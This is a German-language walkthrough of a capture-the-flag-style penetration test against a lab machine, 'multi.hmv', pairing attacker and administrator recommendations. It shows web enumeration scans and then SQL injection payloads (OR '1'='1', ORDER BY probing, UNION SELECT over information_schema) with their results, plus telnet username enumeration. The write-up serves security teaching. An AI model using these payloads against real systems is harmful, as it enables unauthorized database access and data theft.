+            <p class="evaluation"><strong>Bewertung:</strong> Die Bestätigung der Apache-Version ist nützlich für die Suche nach spezifischen Schwachstellen. Die erlaubten Methoden sind Standard und deuten nicht sofort auf eine Schwachstelle hin, obwohl die `OPTIONS`-Methode manchmal für die Informationsgewinnung missbraucht werden kann. Ansonsten liefert diese Anfrage das erwartete Ergebnis einer Standard-Apache-Installation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe als Nächstes ein Directory-Bruteforcing durch, um versteckte Dateien oder Verzeichnisse zu finden. Prüfe auf häufige Fehlkonfigurationen bei Apache-Servern, wie z.B. zugängliche `.htaccess`- oder Konfigurationsdateien.
+<br><strong>Empfehlung (Admin):</strong> Es ist eine bewährte Praxis, die genaue Softwareversion aus den HTTP-Headern zu entfernen, um Angreifern die Informationsgewinnung zu erschweren. Dies kann in der Apache-Konfiguration über Direktiven wie `ServerTokens Prod` und `ServerSignature Off` erreicht werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::::::::::::: Nikto Scan ::::::::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.185
++ Target Hostname:    192.168.2.185
++ Target Port:        80
++ Start Time:         2025-10-01 22:12:40 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.62 (Debian)
++ <span class="command">/: The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ <span class="command">/: The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">/: Server may leak inodes via ETags, header found with file /, inode: 2cb, size: 63a1eaf063a31, mtime: gzip.</span> See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ <span class="command">/pub/: This might be interesting.</span>
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2025-10-01 22:13:05 (GMT2) (25 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Web-Schwachstellen-Scanner `Nikto` wurde auf Port 80 ausgeführt. Er identifizierte mehrere sicherheitsrelevante, aber niedrigschwellige Probleme: das Fehlen von wichtigen Security-Headern (`X-Frame-Options`, `X-Content-Type-Options`) und ein mögliches Informationsleck durch ETags. Der wichtigste Fund ist jedoch die Entdeckung eines potenziell interessanten Verzeichnisses: `/pub/`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Während die fehlenden Header als "Best Practice"-Verstöße gelten und die ETag-Schwachstelle meist nur von geringem Nutzen ist, ist die Entdeckung des `/pub/`-Verzeichnisses ein konkreter und vielversprechender Anhaltspunkt. Solche Verzeichnisse enthalten oft öffentlich zugängliche Dateien, die versehentlich sensible Informationen preisgeben könnten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das `/pub/`-Verzeichnis muss sofort manuell im Browser und mit weiteren Enumeration-Tools untersucht werden, um seinen Inhalt zu aufzudecken.
+<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Security-Header (`X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`), um die Sicherheit gegen Clickjacking und MIME-Sniffing-Angriffe zu erhöhen. Überprüfen Sie den Inhalt des `/pub/`-Verzeichnisses und stellen Sie sicher, dass keine sensiblen Informationen öffentlich zugänglich sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://multi.hmv/pub/
+Nothing here
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein direkter Besuch des von `Nikto` gefundenen Verzeichnisses `/pub/` im Browser zeigt eine leere Seite mit dem Text "Nothing here".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bedeutet, dass zwar eine `index.html`-Datei existiert, diese aber keinen nützlichen Inhalt hat. Es bedeutet jedoch nicht, dass das Verzeichnis leer ist. Es könnten andere, nicht direkt verlinkte Dateien in diesem Verzeichnis existieren. Die Directory-Enumeration mit einer Wortliste ist hier der nächste logische Schritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auch wenn die Startseite leer ist, führe ein Content-Discovery-Tool wie `feroxbuster` oder `gobuster` gezielt gegen das `/pub/`-Verzeichnis aus, um versteckte Dateien oder Unterverzeichnisse zu finden.
+<br><strong>Empfehlung (Admin):</strong> Wenn ein Verzeichnis keine öffentlichen Inhalte bereitstellen soll, sollte es entweder entfernt oder der Zugriff darauf per Konfiguration (z.B. `.htaccess` oder in der Apache-Konfiguration) komplett verweigert werden. Eine leere Index-Seite bietet nur Scheinsicherheit.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">feroxbuster --url "http://multi.hmv/" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml,.gif -s 200 301 302</span></div>
+                    <pre>
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://multi.hmv/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml, gif]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET      366l      933w    10699c http://multi.hmv/index.html</span>
+<span class="command">301      GET        9l       28w      304c http://multi.hmv/pub => http://multi.hmv/pub/</span>
+<span class="command">200      GET       24l      126w    10354c http://multi.hmv/icons/openlogo-75.png</span>
+<span class="command">200      GET      366l      933w    10699c http://multi.hmv/</span>
+<span class="command">200      GET       12l       19w      230c http://multi.hmv/pub/index.html</span>
+[##########&gt;---------] - 12m  6603328/12791871 11m     found:5       errors:0      
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_multi_hmv_-1759350669.state ...
+[##########&gt;---------] - 12m  6603496/12791871 11m     found:5       errors:0      
+[##########&gt;---------] - 12m  3301592/6395834 4564/s  http://multi.hmv/ 
+[##########&gt;---------] - 12m  3300258/6395834 4564/s  http://multi.hmv/pub/   
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `feroxbuster` wurde ein umfassender Brute-Force-Angriff auf Verzeichnisse und Dateien des Webservers auf Port 80 gestartet. Als Wortliste wurde die populäre `directory-list-2.3-medium.txt` aus den `seclists` verwendet. Der Scan wurde nach 12 Minuten manuell abgebrochen, hat aber die bereits von Nikto entdeckte `/pub/`-Seite bestätigt und zusätzlich das Verzeichnis `/icons/` gefunden. Es wurden keine weiteren hochinteressanten Dateien oder Verzeichnisse aufgedeckt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Bestätigung von `/pub/` untermauert dessen Relevanz. Das `/icons/`-Verzeichnis ist typischerweise ein Standardverzeichnis von Apache und selten sicherheitsrelevant. Das Fehlen weiterer signifikanter Funde (wie `/admin`, `/config`, `.bak`-Dateien) deutet darauf hin, dass die offensichtlichen Angriffsvektoren auf dieser Webseite begrenzt sind. Der Abbruch des Scans ist legitim, um Zeit zu sparen und sich auf die vielversprechenderen Angriffsvektoren zu konzentrieren, die bereits identifiziert wurden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Web-Enumeration für Port 80 kann vorerst als abgeschlossen betrachtet werden. Der Fokus sollte sich nun vollständig auf die Analyse des Inhalts von `/pub/` und die Untersuchung des zweiten Webservers auf Port 28080 verlagern.
+<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Verzeichnisauflistung (Directory Listing) auf dem Webserver deaktiviert ist, um zu verhindern, dass Angreifer den Inhalt von Verzeichnissen ohne eine `index.html`-Datei einsehen können. Unnötige Standard-Verzeichnisse wie `/icons/` können, falls nicht benötigt, entfernt oder der Zugriff darauf blockiert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">curl -Iv http://192.168.2.185:28080</span></div>
+                    <pre>
+*   Trying 192.168.2.185:28080...
+* Connected to 192.168.2.185 (192.168.2.185) port 28080
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.185:28080
+&gt; User-Agent: curl/8.15.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt; <span class="command">Server: Werkzeug/3.1.3 Python/3.9.2</span>
+Server: Werkzeug/3.1.3 Python/3.9.2
+&lt; Date: Wed, 01 Oct 2025 20:35:51 GMT
+Date: Wed, 01 Oct 2025 20:35:51 GMT
+&lt; Content-Type: text/html; charset=utf-8
+Content-Type: text/html; charset=utf-8
+&lt; Content-Length: 586
+Content-Length: 586
+&lt; Connection: close
+Connection: close
+&lt; 
+
+* shutting down connection #0
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.185:28080/
+
+Welcome
+Username:
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine `curl`-Anfrage, gezielt gegen Port 28080, bestätigt, dass hier ein Python-basierter Webserver läuft, genauer gesagt `Werkzeug/3.1.3` auf `Python/3.9.2`. Ein anschließender Besuch der Seite im Browser zeigt eine einfache Anmeldeseite mit der Überschrift "Welcome" und einem Eingabefeld für einen "Username".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein extrem vielversprechender Angriffsvektor. Werkzeug ist ein WSGI-Utility-Framework, das oft zusammen mit Web-Frameworks wie Flask oder Django verwendet wird. Solche benutzerdefinierten Anwendungen sind häufig anfällig für eine Vielzahl von Schwachstellen, insbesondere Template-Injection (SSTI) oder SQL-Injection, da die Eingabevalidierung oft unzureichend implementiert ist. Die Anmeldeseite selbst ist ein direkter Einstiegspunkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste die Anwendung auf bekannte Schwachstellen. Gib Test-Benutzernamen ein (z.B. die via `enum4linux` gefundenen: `todd`, `xiao`). Probiere SSTI-Payloads (z.B. `\{\{7*7\}\}`) und SQL-Injection-Payloads (z.B. `' OR '1'='1' --`), um die Reaktion des Backends zu analysieren.
+<br><strong>Empfehlung (Admin):</strong> Der Quellcode der Python-Anwendung muss einem gründlichen Security Code Review unterzogen werden. Alle Benutzereingaben müssen serverseitig rigoros validiert und kontextbezogen escaped werden, um Injection-Angriffe zu verhindern. Parametrisierte Abfragen (Prepared Statements) sind für alle Datenbankinteraktionen zwingend zu verwenden.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">curl 'http://192.168.2.185:28080/search?q=\{\{7*7\}\}'</span></div>
+                    <pre>
+ 
+&lt;h3&gt;Redirecting...&lt;/h3&gt;
+ You should be redirected automatically to the target URL: . If not, click the link.
+               
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Test auf der Webanwendung auf Port 28080 war eine einfache Payload (`\{\{7*7\}\}`), um eine Server-Side Template Injection (SSTI) zu prüfen. Anstatt das Ergebnis der Multiplikation (49) zu sehen, erhielten wir eine Weiterleitung. Dies deutet darauf hin, dass die Eingabe zwar verarbeitet wird, aber möglicherweise nicht direkt im Template gerendert wird oder dass es eine Art von Schutzmechanismus gibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl der SSTI-Versuch nicht direkt erfolgreich war, hat er eine Reaktion vom Server provoziert. Der nächste logische Schritt ist es, die Anwendung in ihrem vorgesehenen Kontext zu verwenden – also die Suchfunktion, nachdem man sich "angemeldet" hat, um zu sehen, wie die Eingabe dort verarbeitet wird. Ich habe mich, wie im nächsten Schritt zu sehen ist, ohne Passwort als `todd` eingeloggt, da die Anwendung nur nach einem Benutzernamen fragt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melde dich mit einem der bekannten Benutzernamen (z.B. `todd`) an der Anwendung an und nutze die Suchfunktion. Wiederhole dort die SSTI- und andere Injection-Tests, um zu sehen, ob die Eingabe an dieser Stelle anders behandelt wird.
+<br><strong>Empfehlung (Admin):</strong> Die Anwendung sollte so konfiguriert werden, dass sie bei unerwarteten oder potenziell bösartigen Eingaben eine generische Fehlermeldung ausgibt, anstatt einer Weiterleitung. Detaillierte Fehlermeldungen oder unerwartetes Verhalten können einem Angreifer wertvolle Hinweise liefern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.185:28080/search
+
+Welcome, todd
+
+User Search | Logout
+Search User:
+ 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach der Eingabe des Benutzernamens `todd` auf der Startseite wurde ich zur `/search`-Seite weitergeleitet. Es wurde kein Passwort benötigt. Dies zeigt eine unsichere Authentifizierungsmethode, die nur auf dem Benutzernamen basiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine signifikante Schwachstelle für sich. Jeder, der einen gültigen Benutzernamen kennt, kann sich als dieser Benutzer ausgeben. Da wir bereits mehrere Benutzernamen enumeriert haben, haben wir jetzt Zugriff auf die Kernfunktionalität der Anwendung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Suchfunktion ist nun zugänglich. Führe hier die geplanten Injection-Tests durch.
+<br><strong>Empfehlung (Admin):</strong> Eine Authentifizierung muss immer auf mindestens zwei Faktoren basieren, typischerweise Benutzername und Passwort. Eine reine Überprüfung des Benutzernamens ist keine sichere Authentifizierung und muss umgehend durch ein robustes Login-System ersetzt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.185:28080/search
+
+Search: {{'todd' * 2}}
+
+
+Welcome, todd
+
+User Search | Logout
+Search User:
+
+<span class="password">Query failed: syntax error at or near "todd" LINE 1: ...ername, email FROM users WHERE username LIKE '%{{'todd' * 2}... ^</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich mich als `todd` angemeldet hatte, wurde in der Suchfunktion erneut eine SSTI-Payload (`{{'todd' * 2}}`) versucht. Diesmal war die Antwort des Servers extrem aufschlussreich. Wir erhielten eine detaillierte SQL-Fehlermeldung. Die Fehlermeldung zeigt uns den exakten SQL-Query, der im Backend ausgeführt wird. Unsere Eingabe wird direkt und un-escaped in den `LIKE`-Teil einer `SELECT`-Anweisung eingefügt. Dies ist eine klassische und hochkritische SQL-Injection-Schwachstelle.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Durchbruch. Eine SQL-Injection ist bestätigt. Der Fokus verschiebt sich sofort von SSTI zu SQLi. Die detaillierte Fehlermeldung ist ein Geschenk, da sie uns die genaue Struktur der Abfrage verrät und uns erlaubt, unsere Payloads präzise zu konstruieren. Die Datenbank dahinter ist wahrscheinlich PostgreSQL, basierend auf der Fehlermeldungssyntax (`at or near...`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne sofort mit der systematischen Ausnutzung der SQL-Injection. Verwende Payloads wie `' OR '1'='1' --` um die Logik zu umgehen und alle Daten auszulesen. Nutze `UNION`-basierte Angriffe, um die Datenbankstruktur zu enumerieren, Tabellen- und Spaltennamen herauszufinden und schließlich sensible Daten zu extrahieren.
+<br><strong>Empfehlung (Admin):</strong> Dies ist eine kritische Schwachstelle, die sofort behoben werden muss. Der Code muss umgeschrieben werden, um parametrisierte Abfragen (Prepared Statements) zu verwenden. Benutzereingaben dürfen niemals direkt zu SQL-Queries verkettet werden. Alle aktuellen Datenbank-Frameworks bieten sichere Methoden hierfür an.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.185:28080/search
+
+' OR '1'='1' --
+
+Welcome, ' OR '1'='1' --
+
+User Search | Logout
+Search User:
+Search Results
+ID	Username	Email
+<span class="command">1	admin	admin@multi.hmv</span>
+<span class="command">2	guest	guest@multi.hmv</span>
+<span class="command">3	test	test@multi.hmv</span>
+<span class="command">4	xiao	xiao@multi.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die klassische SQL-Injection-Payload `' OR '1'='1' --` wurde in das Suchfeld eingegeben. Die Payload schließt die ursprüngliche `LIKE`-Bedingung ab (`'`), fügt eine Bedingung hinzu, die immer wahr ist (`OR '1'='1'`), und kommentiert den Rest der ursprünglichen Abfrage aus (`--`). Das Ergebnis ist, dass die `WHERE`-Klausel effektiv zu `WHERE username LIKE '%' OR '1'='1'` wird, was alle Einträge aus der `users`-Tabelle zurückgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff war zu 100% erfolgreich. Wir haben die Authentifizierungs- und Suchlogik umgangen und den Inhalt der `users`-Tabelle geleakt. Dies bestätigt nicht nur die SQL-Injection, sondern gibt uns auch weitere gültige Benutzernamen preis: `admin`, `guest`, `test` und bestätigt `xiao`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Enumeration der Datenbank. Bestimme die Anzahl der Spalten in der ursprünglichen `SELECT`-Anweisung mit `ORDER BY`, um `UNION`-Angriffe vorzubereiten.
+<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung. Die Anfälligkeit ist hiermit praktisch bewiesen (Proof of Concept). Die Webanwendung muss sofort offline genommen werden, bis die Schwachstelle behoben ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+von 1 - 3 keine ausgabe dann bei 4
+
+Welcome, ' OR '1'='1' --
+
+User Search | Logout
+Search User:
+
+<span class="password">Query failed: ORDER BY position 4 is not in select list LINE 1: ...me, email FROM users WHERE username LIKE '%' ORDER BY 4 --%' ^</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die Anzahl der Spalten für einen `UNION`-basierten Angriff zu ermitteln, wurde die `ORDER BY`-Klausel verwendet. Ich habe inkrementell die Spaltennummer getestet (`ORDER BY 1`, `ORDER BY 2`, etc.). Die Abfragen mit `1`, `2` und `3` waren erfolgreich, was bedeutet, dass die `SELECT`-Anweisung mindestens 3 Spalten hat. Beim Versuch mit `ORDER BY 4` schlug die Abfrage fehl, weil die 4. Position nicht in der Auswahlliste vorhanden ist. Dies bestätigt, dass die ursprüngliche Abfrage exakt 3 Spalten zurückgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Information ist entscheidend. Wir wissen jetzt, dass unser `UNION SELECT`-Statement ebenfalls genau 3 Spalten enthalten muss, damit die Abfrage syntaktisch korrekt ist und ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe nun `UNION SELECT`-Angriffe durch, um Informationen direkt aus der Datenbank zu extrahieren. Beginne damit, die Datenbankversion, den aktuellen Benutzer und andere Metadaten abzufragen.
+<br><strong>Empfehlung (Admin):</strong> Detaillierte Fehlermeldungen sollten in einer Produktionsumgebung niemals an den Endbenutzer ausgegeben werden. Sie geben einem Angreifer wertvolle Informationen über die interne Struktur der Anwendung und der Datenbank. Konfigurieren Sie die Anwendung so, dass sie generische Fehlermeldungen anzeigt und die Details nur serverseitig protokolliert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+' UNION SELECT NULL, username, password FROM users --
+
+
+Welcome, ' OR '1'='1' --
+
+User Search | Logout
+Search User:
+
+<span class="password">Query failed: column "password" does not exist LINE 1: ...RE username LIKE '%' UNION SELECT NULL, username, password F... ^</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein erster Versuch, Passwörter auszulesen, wurde mit der Payload `' UNION SELECT NULL, username, password FROM users --` unternommen. Die Abfrage schlug fehl mit der Meldung, dass die Spalte `password` nicht existiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein interessantes Ergebnis. Es scheint, dass die `users`-Tabelle keine Spalte namens `password` enthält. Dies könnte bedeuten, dass Passwörter in einer anderen Tabelle gespeichert sind oder die Anwendung eine passwortlose Authentifizierung verwendet (was wir bereits beim Login als `todd` gesehen haben). Wir müssen die Tabellen- und Spaltennamen der Datenbank enumerieren, um Klarheit zu schaffen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze das `information_schema` (in den meisten SQL-Datenbanken vorhanden), um die Namen aller Tabellen und Spalten in der aktuellen Datenbank aufzulisten.
+<br><strong>Empfehlung (Admin):</strong> Auch hier gilt: Fehlermeldungen, die Spalten- oder Tabellennamen preisgeben, müssen deaktiviert werden. Die Datenbankstruktur sollte für externe Benutzer eine Blackbox sein.</p>
+        </section>
+
+
+<!-- #teil 3 -->
+
+
+<section id="initial-access" style="padding-top: 40px;">
+            <h2 style="margin-top:0;">Initial Access Fortsetzung...</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+' UNION SELECT NULL, table_name, table_schema FROM information_schema.tables --
+
+
+Welcome, ' OR '1'='1' --
+
+User Search | Logout
+Search User:
+Search Results
+ID	Username	Email
+<span class="command">None	pg_stat_progress_analyze	pg_catalog</span>
+<span class="command">None	pg_indexes	pg_catalog</span>
+<span class="command">None	pg_stat_user_tables	pg_catalog</span>
+<span class="command">None	pg_cast	pg_catalog</span>
+<span class="command">None	pg_shdepend	pg_catalog</span>
+<span class="command">None	column_options	information_schema</span>
+<span class="command">None	pg_foreign_server	pg_catalog</span>
+<span class="command">None	pg_foreign_data_wrapper	pg_catalog</span>
+<span class="command">None	collations	information_schema</span>
+<span class="command">None	routine_privileges	information_schema</span>
+<span class="command">None	referential_constraints	information_schema</span>
+<span class="command">None	pg_inherits	pg_catalog</span>
+<span class="command">None	pg_user_mapping	pg_catalog</span>
+<span class="command">None	pg_statistic	pg_catalog</span>
+<span class="command">None	pg_matviews	pg_catalog</span>
+<span class="command">None	pg_statio_user_indexes	pg_catalog</span>
+....
+...
+..
+.
+<span class="command">None	pg_auth_members	pg_catalog</span>
+<span class="command">None	pg_stat_ssl	pg_catalog</span>
+<span class="command">None	collation_character_set_applicability	information_schema</span>
+<span class="command">None	pg_db_role_setting	pg_catalog</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die Datenbankstruktur zu verstehen, wurde eine `UNION`-Abfrage gegen das `information_schema.tables` gestartet. Diese spezielle Ansicht enthält Metadaten über alle Tabellen in der Datenbank. Die Abfrage listet erfolgreich die Namen (`table_name`) und die zugehörigen Schemata (`table_schema`) aller Tabellen aus, auf die der aktuelle Benutzer Zugriff hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir erhalten eine Flut von Informationen, hauptsächlich über die internen `pg_catalog`- und `information_schema`-Tabellen, was bestätigt, dass es sich um eine PostgreSQL-Datenbank handelt. Zwischen all diesen Systemtabellen muss nun die relevante Anwendungstabelle gefunden werden, die wahrscheinlich `users` heißt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem wir wissen, dass die Tabelle `users` existiert, ist der nächste Schritt, ihre Spalten aufzulisten, um zu bestätigen, warum die `password`-Spalte nicht gefunden wurde.
+<br><strong>Empfehlung (Admin):</strong> Der Zugriff auf das `information_schema` sollte für niedrig privilegierte Anwendungsbenutzer eingeschränkt werden. Obwohl es für die normale Datenbankfunktion oft notwendig ist, kann es in einem Einbruchsszenario die vollständige Enumeration der Datenbankstruktur erheblich erleichtern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
+
+
+Welcome, ' OR '1'='1' --
+
+User Search | Logout
+Search User:
+Search Results
+ID	Username	Email
+<span class="command">None	email	None</span>
+<span class="command">None	username	None</span>
+<span class="command">None	id	None</span>
+4	xiao	xiao@multi.hmv
+2	guest	guest@multi.hmv
+3	test	test@multi.hmv
+1	admin	admin@multi.hmv
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Abfrage zielt auf `information_schema.columns` ab, um die Spaltennamen (`column_name`) speziell für die Tabelle `users` aufzulisten. Das Ergebnis ist eindeutig: Die Tabelle `users` enthält nur die Spalten `id`, `username` und `email`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt endgültig, warum unser vorheriger Versuch, die Spalte `password` abzurufen, fehlgeschlagen ist. Die Anwendung speichert offensichtlich keine Passwörter in dieser Tabelle. Dies stärkt die Hypothese, dass die Authentifizierung entweder passwortlos ist oder Anmeldeinformationen an einem anderen Ort gespeichert werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da wir keine Passwörter aus der Datenbank extrahieren können, müssen wir die SQL-Injection anders nutzen. PostgreSQL bietet mächtige Funktionen, die einem Superuser das Lesen von Dateien vom System oder sogar die Ausführung von Befehlen ermöglichen. Dies ist der nächste logische Eskalationspfad.
+<br><strong>Empfehlung (Admin):</strong> Die Datenbankarchitektur sollte so gestaltet sein, dass sensible Daten logisch getrennt sind. Selbst wenn eine Tabelle kompromittiert wird, sollten Angreifer nicht sofort auf kritische Authentifizierungsinformationen zugreifen können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">telnet 192.168.2.185</span></div>
+                    <pre>
+Trying 192.168.2.185...
+Connected to 192.168.2.185.
+Escape character is '^]'.
+Username: 
+todd
+Password: 
+<span class="password">login failed</span>
+Connection closed by foreign host.
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">telnet 192.168.2.185</span></div>
+                    <pre>
+Trying 192.168.2.185...
+Connected to 192.168.2.185.
+Escape character is '^]'.
+Username: 
+secure_user
+Password: 
+<span class="password">login failed</span>
+Connection closed by foreign host.
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">telnet 192.168.2.185</span></div>
+                    <pre>
+Trying 192.168.2.185...
+Connected to 192.168.2.185.
+Escape character is '^]'.
+Username: 
+admin
+Password: 
+<span class="password">login failed</span>
+Connection closed by foreign host.
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Hackerben)-[~]
+└─# <span class="command">telnet 192.168.2.185</span></div>
+                    <pre>
+Trying 192.168.2.185...
+Connected to 192.168.2.185.
+Escape character is '^]'.
+Username: 
+xiao
+Password: 
+<span class="password">invalid password</span>
+Connection closed by foreign host.
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Parallel zur SQL-Injection-Untersuchung wurden manuelle Login-Versuche über Telnet für die zuvor enumerierten Benutzer (`todd`, `secure_user`, `admin`, `xiao`) durchgeführt. Es wurden leere Passwörter und einfache Standardpasswörter ausprobiert. Alle Versuche schlugen fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Auffällig ist die unterschiedliche Rückmeldung für den Benutzer `xiao` (`invalid password`) im Vergleich zu den anderen (`login failed`). Dies ist ein klassisches Beispiel für ein "Username Enumeration"-Verhalten. Es bestätigt mit hoher Wahrscheinlichkeit, dass der Benutzer `xiao` auf dem System existiert und für den Telnet-Login aktiviert ist, während die anderen entweder nicht existieren oder nicht für Telnet freigeschaltet sind. Dies macht `xiao` zu einem primären Ziel, falls wir ein Passwort finden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalte den Benutzer `xiao` als valides Ziel im Auge. Konzentriere dich aber vorerst weiter auf die Ausnutzung der SQL-Injection, da diese bereits einen mächtigeren Angriffsvektor darstellt.
